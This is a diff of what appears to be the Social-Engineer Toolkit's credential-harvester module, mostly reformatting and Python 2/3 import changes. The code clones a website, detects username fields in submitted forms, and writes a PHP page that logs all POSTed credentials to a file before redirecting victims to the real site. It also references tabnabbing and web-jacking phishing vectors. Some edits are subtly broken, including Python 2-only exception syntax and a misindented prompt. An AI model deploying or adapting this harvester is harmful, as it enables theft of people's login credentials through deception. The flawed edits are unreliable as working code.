@@ -16,10 +16,11 @@ import socket
 
 # needed for python2 -> 3
 try:
-    from socketserver import *
+    from SocketServer import *
+    import SocketServer
 
 except ImportError:
-    from SocketServer import *
+    from socketserver import *
 
 import threading
 import datetime
@@ -35,7 +36,6 @@ from set_config import WEBATTACK_EMAIL as webattack_email
 from set_config import TRACK_EMAIL_ADDRESSES as track_email
 from set_config import HARVESTER_LOG as logpath
 sys.path.append(definepath)
-
 
 if track_email == True:
     print_status("You have selected to track user accounts, Apache will automatically be turned on to handle tracking of users.")
@@ -324,7 +324,7 @@ class SETHandler(BaseHTTPRequestHandler):
             line = line.rstrip()
             # if regular expression hit on user fields then do different
             match = re.search(
-                "Email|email|login|logon|Logon|Login|user|username|Username", line)
+                "Email|email|login|logon|Logon|Login|user|username|Username|User", line)
             if match:
                 print(bcolors.RED + "POSSIBLE USERNAME FIELD FOUND: " + line + "\r" + bcolors.GREEN)
                 counter = 1
@@ -376,8 +376,7 @@ class SETHandler(BaseHTTPRequestHandler):
             counter = 1
 
         # when done posting send them back to the original site
-        self.wfile.write(
-            '<html><head><meta HTTP-EQUIV="REFRESH" content="0; url=%s"></head></html>' % (RAW_URL))
+        self.wfile.write('<html><head><meta HTTP-EQUIV="REFRESH" content="0; url=%s"></head></html>' % (RAW_URL))
 
         # set it back to our homepage
         os.chdir(userconfigpath + "web_clone/")
@@ -507,8 +506,7 @@ def run():
         filewrite = open("%s/post.php" % (apache_dir), "w")
         now = str(datetime.datetime.today())
         harvester_file = ("harvester_" + now + ".txt")
-        filewrite.write(
-            """<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND); \n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=%s" />\n""" % (harvester_file, RAW_URL))
+        filewrite.write("""<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND); \n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=%s" />\n""" % (harvester_file, RAW_URL))
         filewrite.close()
         if os.path.isdir("/var/www/html"):
             logpath = ("/var/www/html")
@@ -519,11 +517,9 @@ def run():
 
         # Check sys platform to perform chown
         if sys.platform == "darwin":
-            subprocess.Popen("chown _www:_www '%s/%s'" %
-                             (logpath, harvester_file), shell=True).wait()
+            subprocess.Popen("chown _www:_www '%s/%s'" % (logpath, harvester_file), shell=True).wait()
         else:
-            subprocess.Popen("chown www-data:www-data '%s/%s'" %
-                             (logpath, harvester_file), shell=True).wait()
+            subprocess.Popen("chown www-data:www-data '%s/%s'" % (logpath, harvester_file), shell=True).wait()
 
         # if we are using webjacking, etc.
         if os.path.isfile(userconfigpath + "web_clone/index2.html"):
@@ -531,8 +527,7 @@ def run():
             if os.path.isfile(apache_dir + "/index2.html"):
                 os.remove(apache_dir + "/index2.html")
 
-            shutil.copyfile(userconfigpath + "web_clone/index2.html",
-                            apache_dir + "/index2.html")
+            shutil.copyfile(userconfigpath + "web_clone/index2.html", apache_dir + "/index2.html")
 
         # here we specify if we are tracking users and such
         if track_email == True:
@@ -550,16 +545,11 @@ def run():
             # Without this only index.php|html are copied even though the user
             # may have chosen to import the entire directory in the set module.
             copyfolder(userconfigpath + "web_clone", apache_dir)
-        if os.path.isfile("%s/index.html" % (apache_dir)):
-            os.remove("%s/index.html" % (apache_dir))
-        if track_email == False:
-            shutil.copyfile(userconfigpath + "web_clone/index.html",
-                            "%s/index.html" % (apache_dir))
+        if os.path.isfile("%s/index.html" % (apache_dir)): os.remove("%s/index.html" % (apache_dir))
+        if track_email == False: shutil.copyfile(userconfigpath + "web_clone/index.html", "%s/index.html" % (apache_dir))
         if track_email == True:
-            shutil.copyfile(userconfigpath + "web_clone/index.html",
-                            "%s/index.php" % (apache_dir))
-            print_status(
-                "NOTE: The URL to click on is index.php NOT index.html with track emails.")
+            shutil.copyfile(userconfigpath + "web_clone/index.html", "%s/index.php" % (apache_dir))
+            print_status("NOTE: The URL to click on is index.php NOT index.html with track emails.")
         print_status("All files have been copied to %s" % (apache_dir))
         if attack_vector != 'multiattack':
             try:
@@ -575,7 +565,7 @@ def run():
 class SecureHTTPServer(HTTPServer):
 
     def __init__(self, server_address, HandlerClass):
-        BaseServer.__init__(self, server_address, HandlerClass)
+        SocketServer.BaseServer.__init__(self, server_address, HandlerClass)
         # SSLv2 and SSLv3 supported
         ctx = SSL.Context(SSL.SSLv23_METHOD)
         # pem files defined before
@@ -586,24 +576,27 @@ class SecureHTTPServer(HTTPServer):
         # establish public/client certificate
         ctx.use_certificate_file(fpem_cli)
         # setup the ssl socket
-        self.socket = SSL.Connection(ctx, socket.socket(
-            self.address_family, self.socket_type))
+        self.socket = SSL.Connection(ctx, socket.socket(self.address_family, self.socket_type))
         # bind to interface
         self.server_bind()
         # activate the interface
         self.server_activate()
 
-    def shutdown_request(self, request): request.shutdown()
+    def shutdown_request(self, request): 
+        request.shutdown()
 
 
 def ssl_server(HandlerClass=SETHandler, ServerClass=SecureHTTPServer):
-        # bind to all interfaces on 443
 
-    server_address = ('', 443)  # (address, port)
-    # setup the httpd server
-    httpd = ServerClass(server_address, HandlerClass)
-    # serve the httpd server until exit
-    httpd.serve_forever()
+    try:
+        # bind to all interfaces on 443
+        server_address = ('', 443)  # (address, port)
+        # setup the httpd server
+        httpd = ServerClass(server_address, HandlerClass)
+        # serve the httpd server until exit
+        httpd.serve_forever()
+    except Exception, e: 
+        print_error("Something went wrong.. Printing error: " + str(e))
 
 if track_email == True:
     webattack_email = True
@@ -618,12 +611,11 @@ if webattack_email == True:
 fileopen = open(userconfigpath + "attack_vector", "r")
 for line in fileopen:
     line = line.rstrip()
-    if line == 'tabnabbing':
+    if line == 'tabnabbing': 
         print(bcolors.RED + "\n[*] Tabnabbing Attack Vector is Enabled...Victim needs to switch tabs.")
-	print("You may need to copy /var/www/* into /var/www/html depending on where your directory structure is.")
-	raw_input("Press {return} if you understand what we're saying here.")
-    if line == 'webjacking':
-        print(bcolors.RED + "\n[*] Web Jacking Attack Vector is Enabled...Victim needs to click the link.")
+    print_status("You may need to copy /var/www/* into /var/www/html depending on where your directory structure is.")
+    raw_input("Press {return} if you understand what we're saying here.")
+    if line == 'webjacking': print(bcolors.RED + "\n[*] Web Jacking Attack Vector is Enabled...Victim needs to click the link.")
 
 if ssl_flag == 'true':
     web_port = "443"
@@ -633,13 +625,11 @@ if ssl_flag == 'true':
     if not os.path.isfile(userconfigpath + "newcert.pem"):
         print("PEM files not detected. SSL will not work properly.")
     # copy over our PEM files
-    subprocess.Popen("cp %s/*.pem %s/web_clone/" % (userconfigpath, userconfigpath),
-                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+    subprocess.Popen("cp %s/*.pem %s/web_clone/" % (userconfigpath, userconfigpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
     # copy patched socket over to web clone
     definepath = os.getcwd()
     # we need to move a modified version of socket to handle SSL
-    shutil.copyfile("%s/src/core/patched/socket.py" %
-                    (definepath), "%s/socket.py" % (definepath))
+    shutil.copyfile("%s/src/core/patched/socket.py" % (definepath), "%s/socket.py" % (definepath))
 
 # head over to cloned dir
 if apache_check == False:
@@ -659,7 +649,7 @@ try:
 
     # if we are using ssl
     if ssl_flag == 'true':
-        print "GOAT"
+        print_status("Starting built-in SSL server")
         ssl_server()
 
     # if we aren't using ssl
